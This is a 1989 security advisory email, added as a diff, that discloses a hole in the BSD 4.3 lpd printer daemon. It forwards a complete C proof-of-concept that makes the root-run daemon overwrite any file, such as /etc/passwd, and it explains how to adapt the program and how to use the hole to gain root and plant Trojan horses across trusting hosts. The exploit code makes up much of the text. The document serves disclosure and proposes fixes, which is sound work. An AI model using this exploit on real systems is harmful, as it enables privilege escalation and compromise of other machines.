@@ -1,0 +1,157 @@
+Subject: lpd security problem.
+Date: Wed, 06 Sep 89 10:59:48 EDT
+From: J. Paul Holbrook <ph@SEI.CMU.EDU>
+Index: usr.bin/lpr 4.3BSD-tahoe
+
+I've finally figured out what Scott Bradner's hole was all about.  The
+hole is in BSD 4.3 lpd, the line printer daemon.
+
+The basic problem: as an ordinary user, you can write a simple program
+that will write over any file on your system with any file of your
+choosing.  lpd runs as root, and so it can write anywhere.  Basically
+you tell lpd to create a new spool file with any name you choose (say,
+/etc/passwd), and then you give it the bytes that go into that file.
+Scott has included a program below that acts as a rogue 'cp': you give
+it the name of the file you want to write someplace else, and you give
+it the name of the new file name.  lpd quietly overwrites the file.
+This all works locally because lpd listens to Unix domain sockets
+without doing any checking.
+
+As Scott points out, the problem is even worse than that.  When
+getting requests from another host on tcp connections, lpd does
+require that the connection come in over a privileged port.  But
+because you can compromise any host that you've got an account on so
+easily, all you need do is get root access on one machine, and then
+use another program running as root to write files to any other
+machine on your net running lpd.  All that's required is that the
+machine you're running from be in the hosts.equiv for the remote
+machine you want to compromise.  This is rather nasty: you could get
+root access or plant a Trojan horse on any number of machines without
+actually logging into them once you compromised one machine on a net.
+And all you need to compromise that first machine is any normal user
+account.
+
+I've tried Scott's test program out on an Ultrix 2.2 system and a Sun
+4.0.3 system; it works on both of them.  And as Scott points out, this
+would affect any 4.3 BSD based system.
+
+Scott suggests a couple of workarounds in his message; all would
+require modifying lpd.
+
+If you want to try out Scott's program, replace 'lw1' in the line
+	write(s, "\2lw1\n", 5);
+with the name of some printer on your system.  (If the name isn't
+three characters, don't forget to change '5' to the proper number of
+bytes.)
+
+------- Forwarded Message
+Date: Wed, 30 Aug 89 17:10:55 EDT
+From: sob@wjh12.harvard.edu (Scott Bradner)
+Subject: lpd security problem for Paul Holbrook
+
+Re: Security hole in BSD lpd
+
+Paul,
+	Here is a quick description of the problem and
+a program that can exploit the hole.
+
+	Please keep me informed as to what is going on.
+
+Scott Bradner
+Harvard University
+617-495-3864
+
+The problem:
+	a/ lpd can be told to name a spool file anything
+	b/ lpd runs as root
+	c/ although the tcp connection to lpd is required to
+	   be from a priveledged port it still means that one
+	   must trust the remote system
+	d/ there are no checks if the request comes in via
+	   the unix domain socket
+
+The solution:
+	a/ remove unix domain interface to lpd
+	b/ disallow spool filenames with slashes in them
+	c/ rethink lpd security
+
+
+
+A demo program.
+
+This is a version of cp that uses lpd to do the deed.
+ (the same thing can be done from a remote computer as long as
+  it has permission to run a printer on this host. )
+
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/stat.h>
+
+#include <stdio.h>
+
+struct sockaddr_un sun = { AF_UNIX, "/dev/pranter" };
+char buf[1024];
+struct stat statb;
+
+main(argc, argv)
+char **argv;
+{
+	register int n, cnt, s;
+	unsigned char c;
+
+	if(argc != 3) {
+		fprintf(stderr, "Usage: %s from to\n", argv[0]);
+		exit(1);
+	}
+	if((n = open(argv[1], 0)) < 0) {
+		perror(argv[1]);
+		exit(1);
+	}
+	fstat(n, &statb);
+	if((s = socket(AF_UNIX, SOCK_STREAM, 0)) < 0) {
+		perror("socket");
+		exit(1);
+	}
+	if(connect(s, &sun, strlen(sun.sun_path) + 2) < 0) {
+		perror("connect");
+		exit(1);
+	}
+	write(s, "\2lw1\n", 5);
+	read(s, &c, 1);
+	if(c) {
+		fprintf(stderr, "Error %d on queuejob\n", c);
+		exit(1);
+	}
+	sprintf(buf, "\3%ld %s\n", statb.st_size, argv[2]);
+	write(s, buf, strlen(buf));
+	read(s, &c, 1);
+	if(c) {
+		fprintf(stderr, "Error %d on sendfile\n", c);
+		exit(1);
+	}
+	while((cnt = read(n, buf, sizeof(buf))) > 0)
+		write(s, buf, cnt);
+	write(s, "", 1);
+	read(s, &c, 1);
+	if(c) {
+		fprintf(stderr, "Error %d after sendfile\n", c);
+		exit(1);
+	}
+	sprintf(buf, "\3%ld %s\n", 10L, "dfA000somewhere");
+	write(s, buf, strlen(buf));
+	read(s, &c, 1);
+	if(c) {
+		fprintf(stderr, "Error %d on sendfile\n", c);
+		exit(1);
+	}
+	write(s, "xxxxxxxxxx", 10);
+	write(s, "", 1);
+	read(s, &c, 1);
+	if(c) {
+		fprintf(stderr, "Error %d after sendfile\n", c);
+		exit(1);
+	}
+	exit(0);
+}
